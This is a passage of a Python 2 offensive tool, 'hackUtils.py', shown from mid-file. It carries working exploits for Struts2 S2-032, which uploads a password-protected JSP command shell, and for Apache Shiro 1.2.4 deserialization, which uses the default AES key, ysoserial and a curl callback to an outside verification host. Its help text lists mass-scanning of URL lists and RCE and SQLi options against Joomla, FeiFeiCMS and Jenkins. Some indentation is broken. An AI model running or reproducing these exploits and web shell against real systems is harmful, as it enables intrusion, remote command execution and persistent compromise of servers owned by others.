    shellcontent_win="%3C%25%0A%20%20%20%20if%28%22"+shellpwd+"%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"
    shellcontent_linux="%3C%25%0A%20%20%20%20if%28%22"+shellpwd+"%22.equals%28request.getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%20%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29.getInputStream%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3Cpre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E"

    try:
        result = exploitS2032(poc)
        if "Local Address" in result:
            try:
                root_path = exploitS2032(poc_root_path).strip()
                whoami = exploitS2032(poc_whoami).strip()
                if ":" in root_path:
                    system = "Windows"
                        exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_win+"&encoding=UTF-8&pp=%2f"
                else:
                    system = "Linux"
                        exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_linux+"&encoding=UTF-8&pp=%2f"
                shell_path = exploitS2032(exp).strip() + ' (pwd: '+shellpwd+', cmd: whoami)'
            except Exception, e:
                root_path = "unknown"
                whoami = "unknown"
                shell_path = "unknown"
                system = "unknown"
            vuls='[+] vuls found! url: '+url+', system: '+ system +', whoami: '+whoami+', root_path: '+root_path+', shell_path: '+shell_path
            logfile(vuls,'s2032_rce.txt')
            print vuls
        else:
            print '[!] no vuls! url: '+url
    except Exception,e:
        print '[!] connection failed! url: '+url

def exploitS2032(exp):
    response = requests.get(exp, timeout=10)
    return response.content

def rceApacheShiro(value):
    value_url = value.strip().split("::")[0]
    if len(value.strip().split("::"))>1:
        value_cmdstr = value.strip().split("::")[1]
    else:
        value_cmdstr = ''
    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
    print "["+str(now)+"] [INFO] Checking Apache Shiro 1.2.4 Remote Code Execution..."
    if os.path.exists(value_url.strip()):
        urlfile=open(value_url,'r')
        for url in urlfile:
            if url.strip():
                checkApacheShiro(url, value_cmdstr)
        urlfile.close()
    else:
        checkApacheShiro(value_url, value_cmdstr)
    output = os.path.dirname(os.path.realpath(__file__))+"/shiro.txt"
    if os.path.exists(output):
        print "\n[INFO] Scanned Vuls:"
        print "[*] Output File: "+output

def checkApacheShiro(url, cmdstr):
    url = url.strip()
    try:
        key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
        id = hashlib.md5(str(time.strftime('%H:%M:%S',time.localtime(time.time())))+str(random.random())).hexdigest()
        verify_url = 'http://cloudeye.avfisher.win/index.php?id='+id
        cmdcheck='curl '+verify_url+'&flag=rceApacheShiro'
        check=exploitApacheShiro(url, cmdcheck)
        time.sleep(5)
        verify = requests.get(verify_url, timeout=10, verify=False).content
        if check == "succeed" and id in verify:
            if cmdstr != "":
                exploitApacheShiro(url, cmdstr)
            vul= "[+] vuls found! url: "+url
            logfile(vul,'shiro.txt')
            print vul
        else:
            print '[!] no vuls! url: '+url
    except Exception, e:
        print str(e)
        print '[!] connection failed! url: '+url

def exploitApacheShiro(url,cmdstr):
    key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
    payload = generateApacheShiroPayload(cmdstr)
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/45.0.2454.101 Safari/537.36',
            'Cookie': 'rememberMe=%s' % shiroAesEncryption(key, open(payload, 'rb').read()),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
    conn = requests.get(url, timeout=10, verify=False, headers=headers)
    status_conn = conn.status_code
    if os.path.exists(os.path.dirname(os.path.realpath(__file__))+"/"+payload):
        os.remove(os.path.dirname(os.path.realpath(__file__))+"/"+payload)
    if status_conn == 200:
        return "succeed"
    else:
        return "failed"

def shiroAesEncryption(key, text):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
    unpad = lambda s: s[0:-ord(s[-1])]
    IV = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, IV=IV)
    data = base64.b64encode(IV + cipher.encrypt(pad(text)))
    return data

def generateApacheShiroPayload(cmdstr):
    payload = "payload.t"
    cmd = "java -jar ysoserial-0.0.4-all.jar CommonsCollections2 '"+cmdstr+"' > "+payload
    (status, output) = commands.getstatusoutput(cmd)
    if status == 0:
        return payload
    else:
        print "[!] generate payload failed!"
        exit()

def myhelp():
    print '''
     _                _    _   _ _   _ _             _____  _____
    | |              | |  | | | | | (_) |           |  _  |/ __  \
            | |__   __ _  ___| | _| | | | |_ _| |___  __   _| |/' |`' / /'
    | '_ \ / _` |/ __| |/ / | | | __| | / __| \ \ / /  /| |  / /
    | | | | (_| | (__|   <| |_| | |_| | \__ \  \ V /\ |_/ /./ /___
    |_| |_|\__,_|\___|_|\_\\\\___/ \__|_|_|___/   \_/  \___(_)_____/
    '''
    print "Usage: hackUtils.py [options]\n"
    print "Options:"
    print "  -h, --help                                          Show basic help message and exit"
    print "  -b keyword, --baidu=keyword                         Fetch URLs from Baidu based on specific keyword"
    print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
    print "  -i keyword, --censysip=keyword                      Fetch IPs from Censys based on specific keyword"
    print "  -u keyword, --censysurl=keyword                     Fetch URLs from Censys based on specific keyword"
    print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
    print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
    print "  -r url|file, --rce=url|file                         Exploit Remote Code Execution for Joomla 1.5 - 3.4.5 (Password: handle)"
    print "  -f url|file, --ffcms=url|file                       Exploit Remote Code Execution for FeiFeiCMS 2.8 (Password: 1)"
    print "  -k ip|file[::cmd], --jenkins=ip|file[::cmd]         Exploit Remote Code Execution for XStream (Jenkins CVE-2016-0792)"
    print "  -o url|file[::cmd], --shiro=url|file[::cmd]         Exploit Remote Code Execution for Apache Shiro 1.2.4"
    print "  -s url|file, --s2032=url|file                       Exploit Remote Code Execution for Struts2 (S2-032)"
    print "  -d site, --domain=site                              Scan subdomains based on specific site"
    print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
    print "\nExamples:"
    print "  hackUtils.py -b inurl:www.example.com"
    print "  hackUtils.py -g inurl:www.example.com"
    print "  hackUtils.py -i 1099.java-rmi"
    print "  hackUtils.py -u 1099.java-rmi"
    print "  hackUtils.py -w .php?id="
    print "  hackUtils.py -j http://www.joomla.com/"
    print "  hackUtils.py -j urls.txt"
    print "  hackUtils.py -r http://www.joomla.com/"
    print "  hackUtils.py -r urls.txt"
    print "  hackUtils.py -f http://www.feifeicms.com/"
    print "  hackUtils.py -f urls.txt"
    print "  hackUtils.py -k 10.10.10.10"
    print "  hackUtils.py -k 10.10.10.10::dir"
    print "  hackUtils.py -k ips.txt"
    print "  hackUtils.py -k ips.txt::\"touch /tmp/jenkins\""
    print "  hackUtils.py -o http://www.shiro.com/::\"touch /tmp/shiro\""
    print "  hackUtils.py -o urls.txt::\"touch /tmp/shiro\""
    print "  hackUtils.py -s http://www.struts2.com/index.action"
    print "  hackUtils.py -s urls.txt"
    print "  hackUtils.py -d example.com"
    print "  hackUtils.py -e text"
    print "\n[!] to see help message of options run with '-h'"

def main():
    try:
        options,args = getopt.getopt(sys.argv[1:],"hb:g:i:u:w:j:r:f:k:o:s:d:e:",["help","baidu=","google=","censysid=","censysurl=","wooyun=","joomla=","rce=","ffcms=","jenkins=","shiro=","s2032=","domain=","encrypt="])
    except getopt.GetoptError:
        print "\n[WARNING] error, to see help message of options run with '-h'"
        sys.exit()

    for name,value in options:
        if name in ("-h","--help"):
            myhelp()
        if name in ("-b","--baidu"):
            fetchUrls('baidu',value,50)
        if name in ("-g","--google"):
            fetchUrls('google',value,50)
        if name in ("-i","--censysip"):
            fetchCensys(value,"ip",50)
        if name in ("-u","--censysurl"):
            fetchCensys(value,"domain",50)
        if name in ("-w","--wooyun"):
            fetchUrls('wooyun',value,50)
        if name in ("-j","--joomla"):
            checkJoomla(value)
        if name in ("-r","--rce"):
            rceJoomla(value)
        if name in ("-f","--ffcms"):
            rceFeiFeiCMS(value)
        if name in ("-k","--jenkins"):
            rceXStreamJenkins(value)
        if name in ("-o","--shiro"):
            rceApacheShiro(value)
        if name in ("-s","--s2032"):
            rceStruts2S2032(value)
        if name in ("-d","--domain"):
            scanSubDomains('baidu',value,50)
        if name in ("-e","--encrypt"):
            encryptStr(value)

if __name__ == '__main__':
    main()
